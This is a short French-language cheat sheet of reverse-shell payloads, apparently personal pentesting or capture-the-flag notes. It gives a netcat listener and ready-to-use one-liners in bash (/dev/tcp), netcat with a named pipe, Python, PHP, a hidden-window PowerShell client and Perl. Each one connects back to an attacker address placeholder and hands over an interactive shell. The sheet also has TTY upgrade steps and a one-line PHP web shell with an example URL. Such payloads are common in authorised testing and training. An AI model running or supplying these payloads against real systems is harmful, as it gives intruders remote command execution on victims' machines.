# Reverse Shells

Se connecter à une machine distante en faisant initier la connexion par la cible.

## Listener (ma machine)

```bash
nc -lvnp 4444
# ou avec rlwrap pour l'historique
rlwrap nc -lvnp 4444
```

## Bash

```bash
bash -i >& /dev/tcp/<IP>/4444 0>&1
```

## Netcat

```bash
nc -e /bin/bash <IP> 4444
# Si -e n'est pas dispo
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <IP> 4444 > /tmp/f
```

## Python

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("<IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

## PHP

```bash
php -r '$sock=fsockopen("<IP>",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
```

## PowerShell

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "& {$c=New-Object Net.Sockets.TCPClient('<IP>',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}}"
```

## Perl

```bash
perl -e 'use Socket;$i="<IP>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'
```

## Upgrade du shell

Une fois connecté, pour avoir un vrai TTY interactif :

```bash
# Sur la cible
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z pour mettre en background
# Sur ta machine
stty raw -echo; fg
# De retour sur la cible
export TERM=xterm
```

## Web shells

```php
# PHP simple
<?php system($_GET['cmd']); ?>

# Utilisation
http://cible.com/shell.php?cmd=whoami
```

## Ressource

[revshells.com](https://www.revshells.com/) — générateur automatique de reverse shells.